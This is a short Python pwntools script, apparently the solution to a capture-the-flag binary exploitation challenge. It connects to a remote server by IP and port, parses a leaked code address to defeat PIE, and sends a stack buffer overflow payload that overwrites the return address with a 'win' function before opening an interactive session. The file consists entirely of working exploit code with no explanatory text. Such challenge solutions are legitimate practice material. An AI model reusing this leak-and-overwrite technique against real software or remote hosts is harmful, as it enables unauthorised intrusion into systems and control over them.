from pwn import *

elf = ELF("./chall")
p = remote("134.112.58.12",10003)

p.recvuntil(b"A watcher's eye glints at: ")
leak = int(p.recvline().strip(), 16)

pie_base = leak - elf.sym["vuln"]
win_func = pie_base + 0x12ae
payload = b"A" * 10
payload += b"\x00"
payload += b"A" * (40 - len(payload))
payload += p64(win_func)

p.sendline(payload)
p.interactive()